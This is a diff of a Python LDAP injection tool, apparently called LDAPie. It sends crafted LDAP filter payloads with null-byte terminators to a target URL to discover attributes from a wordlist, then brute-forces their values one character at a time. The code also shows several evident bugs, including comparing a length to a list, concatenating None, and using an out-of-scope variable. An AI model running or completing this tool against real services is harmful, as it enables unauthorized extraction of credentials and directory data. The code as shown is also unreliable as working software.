@@ -53,24 +53,25 @@ class LDAPie:
     def get(self,filename,user,url):
         with open(wordlist, 'r') as f:
             a = f.read().splitlines()
+            inj = []
             for x in a:
                 url = sys.argv[7]+'='+user+'*)(sn='+user+')('+x+'=*))%00'
                 r = requests.get(url)
                 time.sleep(5)
                 l = r.text
-                inj = []
                 print('\033[1;31m'+url)
                 if len(l) != [cl1]:
                    inj.append(str(x))
-        return inj
+            return inj
 
-    def bruteforce(self,inj,url):
+    def bruteforce(self,inj,user,url):
         val = None
         char = string.letters+string.digits+"""~!@#$%^&*()`-_=+[{]}\|;:'",<.>/?"""
         url = sys.argv[7]
         for i in range(1,100):
             for x in char:
                 bf = requests.get(url+inj+val+x+"*))%00")
+                print(bf)
         if user in r.content:
             val += x
             print("The Value For "+inj+" is "+val)
@@ -118,9 +119,11 @@ cl1 = len(l1)
 m = LDAPie(wordlist)
 if post == True:
     p = m.post(wordlist,user,url)
+#    m.bruteforce(inj,user,url)
     pass
 if get == True:
     g = m.get(wordlist,user,url)
+#    m.bruteforce(inj,user,url)
     pass
 
 elif get == False or post == False:
@@ -140,6 +143,5 @@ elif wordlist == None or url == None:
 -h                      help
 """)
 
-if inj is not None:
-    m.bruteforce(inj,url)
-#    print("The Value For "+x+" is "+val)
+m.bruteforce(inj,user,url)
+print("The Value For "+x+" is "+val)
